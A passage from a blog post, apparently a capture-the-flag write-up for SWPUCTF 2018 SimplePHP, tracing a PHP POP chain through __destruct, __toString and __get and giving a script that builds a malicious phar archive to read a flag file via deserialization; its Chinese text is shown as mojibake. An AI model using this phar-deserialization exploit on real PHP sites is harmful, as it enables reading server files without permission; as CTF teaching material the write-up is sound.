<span class="hljs-function">    </span>&#123;
        $text = base64_encode(file_get_contents($value));
        <span class="hljs-keyword">return</span> $text;
    &#125;
&#125;
<span class="hljs-meta">?&gt;</span></code></pre>
<h4 id="POPé“¾æ„é€ "><a class="header-anchor" href="#POPé“¾æ„é€ ">ğŸ­</a>POPé“¾æ„é€ </h4>
<h5 id="destruct"><a class="header-anchor" href="#destruct">ğŸ­</a>__destruct()</h5>
<p>__destruct()æ˜¯PHPä¸­çš„ææ„æ–¹æ³•ï¼Œåœ¨å¯¹è±¡è¢«é”€æ¯æ—¶è¢«è°ƒç”¨ï¼Œç¨‹åºç»“æŸæ—¶ä¼šè¢«è‡ªåŠ¨è°ƒç”¨é”€æ¯å¯¹è±¡ã€‚å‡½æ•°ä¸­å‘ç°äº†echoï¼Œé‚£ä¹ˆè¦åˆ©ç”¨echo $this-&gt;testã€‚(æˆ‘ä¹ æƒ¯ä»destructå…¥æ‰‹)</p>
<pre><code class="hljs php"><span class="hljs-keyword">public</span> <span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">__destruct</span>(<span class="hljs-params"></span>)</span>
<span class="hljs-function"></span>&#123;
        <span class="hljs-keyword">$this</span>-&gt;test = <span class="hljs-keyword">$this</span>-&gt;str;
        <span class="hljs-keyword">echo</span> <span class="hljs-keyword">$this</span>-&gt;test;
&#125;</code></pre>
<h5 id="toString"><a class="header-anchor" href="#toString">ğŸ­</a>__toString(),</h5>
<p>__toStringæ–¹æ³•åœ¨å°†ä¸€ä¸ªå¯¹è±¡è½¬åŒ–æˆå­—ç¬¦ä¸²æ—¶è¢«è‡ªåŠ¨è°ƒç”¨ï¼Œæ¯”å¦‚è¿›è¡Œechoï¼Œprintæ“ä½œæ—¶ä¼šè¢«è°ƒç”¨å¹¶è¿”å›ä¸€ä¸ªå­—ç¬¦ä¸²ã€‚åˆ©ç”¨$this-&gt;str[â€˜strâ€™]-&gt;source;</p>
<pre><code class="hljs php"><span class="hljs-keyword">public</span> <span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">__toString</span>(<span class="hljs-params"></span>)</span>
<span class="hljs-function"></span>&#123;
        $content = <span class="hljs-keyword">$this</span>-&gt;str[<span class="hljs-string">&#x27;str&#x27;</span>]-&gt;source;
        <span class="hljs-keyword">return</span> $content;
&#125;</code></pre>
<h5 id="getï¼ˆï¼‰"><a class="header-anchor" href="#getï¼ˆï¼‰">ğŸ­</a>__getï¼ˆï¼‰</h5>
<p>__getï¼ˆï¼‰å½“æœªå®šä¹‰çš„å±æ€§æˆ–æ²¡æœ‰æƒé™è®¿é—®çš„å±æ€§è¢«è®¿é—®æ—¶è¯¥æ–¹æ³•ä¼šè¢«è°ƒç”¨ã€‚</p>
<p>åˆ©ç”¨ <code>$this-&gt;get --&gt; $this-&gt;file_get($value); --&gt;base64_encode(file_get_contents($value));</code></p>
<pre><code class="hljs php"><span class="hljs-keyword">public</span> <span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">__get</span>(<span class="hljs-params">$key</span>)</span>
<span class="hljs-function"></span>&#123;
		<span class="hljs-keyword">return</span> <span class="hljs-keyword">$this</span>-&gt;get($key);
		
&#125;
<span class="hljs-keyword">public</span> <span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">get</span>(<span class="hljs-params">$key</span>)</span>
<span class="hljs-function"></span>&#123;
       <span class="hljs-keyword">if</span>(<span class="hljs-keyword">isset</span>(<span class="hljs-keyword">$this</span>-&gt;params[$key])) &#123;
            $value = <span class="hljs-keyword">$this</span>-&gt;params[$key];
		&#125; <span class="hljs-keyword">else</span> &#123;
            $value = <span class="hljs-string">&quot;index.php&quot;</span>;
        &#125;
        <span class="hljs-keyword">return</span> <span class="hljs-keyword">$this</span>-&gt;file_get($value);
&#125;
<span class="hljs-keyword">public</span> <span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">file_get</span>(<span class="hljs-params">$value</span>)</span>
<span class="hljs-function"></span>&#123;
       $text = base64_encode(file_get_contents($value));
       <span class="hljs-keyword">return</span> $text;
&#125;</code></pre>
<p>è°ƒç”¨äº†file_get_contentsï¼Œpopé“¾çš„ç»“æŸã€‚</p>
<p>æ€è·¯ï¼š<code>C1e4r::destruct() --&gt; Show::toString() --&gt; Test::__get() </code></p>
<p>Cle4r: å°†strèµ‹å€¼ä¸ºShowç±»,<code> this-&gt;test=$this-&gt;Show echo $this-&gt;test;</code> è§¦å‘Showç±»ä¸­çš„<code>__tostring</code>é­”æœ¯æ–¹æ³•</p>
<p>==&gt;Show: æ‰§è¡Œ <code>$content=$this-&gt;str['str']-&gt;source; </code>å°†str[â€˜strâ€™]èµ‹å€¼ä¸ºTestç±»,ä½¿å…¶è°ƒç”¨sourceã€‚</p>
<p>==&gt;Test: æ‰§è¡Œ __get($key)ã€‚$keyä¸ºsourceã€‚ <code>get($key) $value=this-&gt;params['source']; file_get_contents($value); </code>paramsæ˜¯æ•°ç»„ï¼Œæ•…å°±å®šä¹‰<code>params=array('source'=&gt;'/var/www/html/fl1g.php');</code></p>
<p>exp</p>
<pre><code class="hljs php"><span class="hljs-meta">&lt;?php</span>
<span class="hljs-class"><span class="hljs-keyword">class</span> <span class="hljs-title">C1e4r</span></span>
<span class="hljs-class"></span>&#123;
    <span class="hljs-keyword">public</span> $test;
    <span class="hljs-keyword">public</span> $str;
&#125;

<span class="hljs-class"><span class="hljs-keyword">class</span> <span class="hljs-title">Show</span></span>
<span class="hljs-class"></span>&#123;
    <span class="hljs-keyword">public</span> $source;
    <span class="hljs-keyword">public</span> $str;
&#125;
<span class="hljs-class"><span class="hljs-keyword">class</span> <span class="hljs-title">Test</span></span>
<span class="hljs-class"></span>&#123;
    <span class="hljs-keyword">public</span> $file;
    <span class="hljs-keyword">public</span> $params;

&#125;

$c1e4r = <span class="hljs-keyword">new</span> C1e4r();
$show = <span class="hljs-keyword">new</span> Show();
$test = <span class="hljs-keyword">new</span> Test();
$test-&gt;params[<span class="hljs-string">&#x27;source&#x27;</span>] = <span class="hljs-string">&quot;/var/www/html/f1ag.php&quot;</span>;
$c1e4r-&gt;str = $show;   
$show-&gt;str[<span class="hljs-string">&#x27;str&#x27;</span>] = $test; 


$phar = <span class="hljs-keyword">new</span> Phar(<span class="hljs-string">&quot;exp.phar&quot;</span>); 
$phar-&gt;startBuffering();
$phar-&gt;setStub(<span class="hljs-string">&#x27;&lt;?php __HALT_COMPILER(); ? &gt;&#x27;</span>); <span class="hljs-comment">//å›ºå®šçš„</span>
$phar-&gt;setMetadata($c1e4r); <span class="hljs-comment">//è§¦å‘çš„å¤´æ˜¯C1e4rç±»ï¼Œæ‰€ä»¥ä¼ å…¥C1e4rå¯¹è±¡</span>
$phar-&gt;addFromString(<span class="hljs-string">&quot;exp.txt&quot;</span>, <span class="hljs-string">&quot;test&quot;</span>); 
$phar-&gt;stopBuffering();

<span class="hljs-meta">?&gt;</span></code></pre>
<p>ç”Ÿæˆæ–‡ä»¶åä¸Šä¼ ï¼Œå› ä¸º<code>upload_file_check()</code>çš„é™åˆ¶éœ€è¦æ”¹åç¼€åï¼Œæ–‡ä»¶åä¸ºMD5ï¼ˆæ–‡ä»¶å+IPï¼‰ç®—å‡ºï¼Œåœ¨fileä¸‹è§¦å‘pharå³å¯</p>
<p><img src="/2021/07/30/black/7.png" srcset="/img/loading.gif" alt="7"></p>
<p>è§£ç è·å¾—flag</p>
<p>å‚è€ƒï¼š<a target="_blank" rel="noopener" href="https://guokeya.github.io/post/swpuctf-2018simplephppop-lian-phar-fan-xu-lie-hua/">https://guokeya.github.io/post/swpuctf-2018simplephppop-lian-phar-fan-xu-lie-hua/</a></p>

            </div>
            <hr>
            <div>
              <div class="post-metas mb-3">
                
                  <div class="post-meta mr-3">
                    <i class="iconfont icon-category"></i>
                    
                      <a class="hover-with-bg" href="/categories/Flask-session%E8%BA%AB%E4%BB%BD%E4%BC%AA%E9%80%A0/">Flask-sessionèº«ä»½ä¼ªé€ </a>
                    
                      <a class="hover-with-bg" href="/categories/Flask-session%E8%BA%AB%E4%BB%BD%E4%BC%AA%E9%80%A0/phar%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96/">pharååºåˆ—åŒ–</a>
                    
                  </div>
                
                
                  <div class="post-meta">
                    <i class="iconfont icon-tags"></i>
                    
                      <a class="hover-with-bg" href="/tags/reverse-shell/">reverse shell</a>
                    
                  </div>
                
              </div>
              
                <p class="note note-warning">æœ¬åšå®¢æ‰€æœ‰æ–‡ç« é™¤ç‰¹åˆ«å£°æ˜å¤–ï¼Œå‡é‡‡ç”¨ <a target="_blank" href="https://creativecommons.org/licenses/by-sa/4.0/deed.zh" rel="nofollow noopener noopener">CC BY-SA 4.0 åè®®</a> ï¼Œè½¬è½½è¯·æ³¨æ˜å‡ºå¤„ï¼</p>
              
              
                <div class="post-prevnext row">
                  <article class="post-prev col-6">
                    
                    
                      <a href="/2021/08/01/regexp/">
                        <i class="iconfont icon-arrowleft"></i>
                        <span class="hidden-mobile">REGEXPæ³¨å…¥ä¸LIKEæ³¨å…¥</span>
                        <span class="visible-mobile">Previous</span>
                      </a>
                    
                  </article>
                  <article class="post-next col-6">
                    
                    
                      <a href="/2021/07/29/session/">
                        <span class="hidden-mobile">buuï¼ˆä¸‰ï¼‰</span>
                        <span class="visible-mobile">Next</span>
                        <i class="iconfont icon-arrowright"></i>
                      </a>
                    
                  </article>
                </div>
              
            </div>

            
          </article>
        </div>
      </div>
    </div>
    
      <div class="d-none d-lg-block col-lg-2 toc-container" id="toc-ctn">
        <div id="toc">
  <p class="toc-header"><i class="iconfont icon-list"></i>&nbsp;TOC</p>
  <div class="toc-body" id="toc-body"></div>
</div>

      </div>
    
  </div>
</div>

<!-- Custom -->


    

    
      <a id="scroll-top-button" href="#" role="button">
        <i class="iconfont icon-arrowup" aria-hidden="true"></i>
      </a>
    

    
      <div class="modal fade" id="modalSearch" tabindex="-1" role="dialog" aria-labelledby="ModalLabel"
     aria-hidden="true">
  <div class="modal-dialog modal-dialog-scrollable modal-lg" role="document">
    <div class="modal-content">
      <div class="modal-header text-center">
        <h4 class="modal-title w-100 font-weight-bold">Search</h4>
        <button type="button" id="local-search-close" class="close" data-dismiss="modal" aria-label="Close">
          <span aria-hidden="true">&times;</span>
        </button>
      </div>
      <div class="modal-body mx-3">
        <div class="md-form mb-5">
          <input type="text" id="local-search-input" class="form-control validate">
          <label data-error="x" data-success="v"
                 for="local-search-input">keyword</label>
        </div>
        <div class="list-group" id="local-search-result"></div>
      </div>
    </div>
  </div>
</div>
    

    
  </main>

  <footer class="text-center mt-5 py-3">
  <div class="footer-content">
     <a href="https://hexo.io" target="_blank" rel="nofollow noopener"><span>Hexo</span></a> <i class="iconfont icon-love"></i> <a href="https://github.com/fluid-dev/hexo-theme-fluid" target="_blank" rel="nofollow noopener"><span>Fluid</span></a> 
  </div>
  

  

  
</footer>

<!-- SCRIPTS -->

  <script  src="https://cdn.staticfile.org/nprogress/0.2.0/nprogress.min.js" ></script>
  <link  rel="stylesheet" href="https://cdn.staticfile.org/nprogress/0.2.0/nprogress.min.css" />

  <script>
    NProgress.configure({"showSpinner":false,"trickleSpeed":200})
    NProgress.start()
    document.addEventListener('DOMContentLoaded', function() {
      window.NProgress && window.NProgress.inc();
    })
    window.addEventListener('load', function() {
      NProgress.done();
    })
  </script>


<script  src="https://cdn.staticfile.org/jquery/3.5.1/jquery.min.js" ></script>
<script  src="https://cdn.staticfile.org/twitter-bootstrap/4.5.3/js/bootstrap.min.js" ></script>
<script  src="/js/debouncer.js" ></script>
<script  src="/js/events.js" ></script>
<script  src="/js/plugins.js" ></script>

<!-- Plugins -->


  
    <script  src="/js/lazyload.js" ></script>
  



  



  <script  src="https://cdn.staticfile.org/tocbot/4.12.0/tocbot.min.js" ></script>



  <script  src="https://cdn.staticfile.org/fancybox/3.5.7/jquery.fancybox.min.js" ></script>



  <script  src="https://cdn.staticfile.org/anchor-js/4.3.0/anchor.min.js" ></script>



  <script defer src="https://cdn.staticfile.org/clipboard.js/2.0.6/clipboard.min.js" ></script>





  <script  src="https://cdn.staticfile.org/typed.js/2.0.11/typed.min.js" ></script>
  <script>
    (function (window, document) {
      var typing = Fluid.plugins.typing;
      var title = document.getElementById('subtitle').title;
      
      typing(title)
      
    })(window, document);
  </script>



  <script  src="/js/local-search.js" ></script>
  <script>
    (function () {
      var path = "/local-search.xml";
      var inputArea = document.querySelector("#local-search-input");
      inputArea.onclick = function () {
        searchFunc(path, 'local-search-input', 'local-search-result');
        this.onclick = null
      }
    })()
  </script>















<!-- ä¸»é¢˜çš„å¯åŠ¨é¡¹ ä¿æŒåœ¨æœ€åº•éƒ¨ -->
<script  src="/js/boot.js" ></script>



</body>
</html>
